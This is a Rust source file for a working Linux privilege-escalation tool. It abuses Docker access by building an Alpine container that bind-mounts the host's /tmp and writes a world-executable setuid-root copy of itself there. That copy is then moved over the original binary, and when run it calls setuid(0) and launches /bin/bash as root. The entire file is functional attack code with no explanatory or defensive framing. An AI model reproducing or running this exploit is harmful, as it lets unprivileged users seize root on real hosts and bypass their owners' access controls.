use std::env;
use std::fs;
use std::os::linux::fs::MetadataExt;
use std::process::Command;

use libc::c_int;

macro_rules! vs {
    ($($x:expr),*) => (vec![$($x.to_string()),*]);
}
macro_rules! s {
    ($($x:expr),*) => ($($x.to_string()),*);
}

fn main() {
    let mut args = get_args();
    let is_check = is_result_check(&mut args);
    let path1 = get_exe_path();
    let is_suid = get_suid_bit(&path1);

    if is_suid {
        println!("> running shell (suid)");
        let result: c_int;
        unsafe { result = libc::setuid(0); }
        if result == -1 {
            println!("cannot set uuid 0");
            std::process::exit(1);
        }
        unsafe { libc::setgid(0); }

        exec(&s!("/bin/bash"), &args, &s!("run bash"));
    } else if !is_check {
        println!("> running script (no suid)");

        println!("extracting files to /tmp/d2r...");
        fs::create_dir_all("/tmp/d2r").expect("Unable to create dir /tmp/d2r");
        fs::copy(&path1, "/tmp/d2r/rs").expect("Unable to copy file to /tmp/d2r/rs");

        let dockerfile = "FROM alpine:3.5\nCOPY r.sh r.sh\nCOPY rs rs\n";
        fs::write("/tmp/d2r/Dockerfile", dockerfile).expect("Unable to write Dockerfile");

        let rsh = "#!/bin/sh\n\ncp -f rs /tmp/rs2\nchmod 4777 /tmp/rs2\n";
        fs::write("/tmp/d2r/r.sh", rsh).expect("Unable to write r.sh");

        println!("docker magic...");
        exec(&s!("docker"), &vs!["build", "--rm", "-t", "d2r", "/tmp/d2r/"], &s!("build docker image"));
        exec(&s!("docker"), &vs!["run", "--name", "d2r", "-v", "/tmp:/tmp", "d2r:latest", "/bin/sh", "r.sh"], &s!("start docker container"));
        println!("cleanup...");
        exec(&s!("docker"), &vs!["rm", "-f", "d2r"], &s!("remove docker container"));
        exec(&s!("docker"), &vs!["rmi", "-f", "d2r:latest"], &s!("remove docker image"));
        exec(&s!("/tmp/rs2"), &vs!["d2r-check", "-v", "-c", "rm -rf /tmp/d2r"], &s!("remove tmp folder"));
        exec(&s!("/tmp/rs2"), &vs!["d2r-check", "-v", "-c", format!("mv -f /tmp/rs2 {path1}")], &s!("move suid executable"));
        println!("checking result...");
        exec(&path1, &vs!["d2r-check"], &s!("run result suid executable"));
    } else {
        println!("> check failed: no suid bit {}", &path1);
        std::process::exit(1);
    }
}

fn get_suid_bit(path: &String) -> bool {
    let metadata = fs::metadata(path).unwrap_or_else(|err| {
        eprintln!("Error getting metadata: {} {}", path, err);
        std::process::exit(1);
    });

    let suid_mask = 0o4000;
    let is_suid = metadata.st_mode() & suid_mask != 0;
    return is_suid;
}

fn get_exe_path() -> String {
    let exe = env::current_exe().unwrap_or_else(|err| {
        eprintln!("Error getting current executable: {}", err);
        std::process::exit(1);
    });
    let path = exe.as_path();
    let path_str = path.to_str().unwrap();
    return path_str.to_string();
}

fn get_args() -> Vec<String> {
    let mut args: Vec<String> = env::args().collect();
    args.remove(0);
    return args;
}

fn is_result_check(args: &mut Vec<String>) -> bool {
    if let Some(arg1) = env::args().nth(1) {
        if arg1.eq("d2r-check") {
            args.remove(0);
            return true;
        }
    }
    return false;
}

fn exec(program: &String, program_args: &Vec<String>, program_desc: &String) {
    Command::new(program)
        .args(program_args)
        .status()
        .unwrap_or_else(|err| {
            eprintln!("Cannot {} : failed to exec {} {}: {}", program_desc, program, program_args.join(", "), err);
            std::process::exit(1);
        })
        .success()
        .then(|| ())
        .ok_or(s!("bad exit code"))
        .unwrap_or_else(|err| {
            eprintln!("Cannot {} : failed to exec {} {}: {}", program_desc, program, program_args.join(", "), err);
            std::process::exit(1);
        });
}
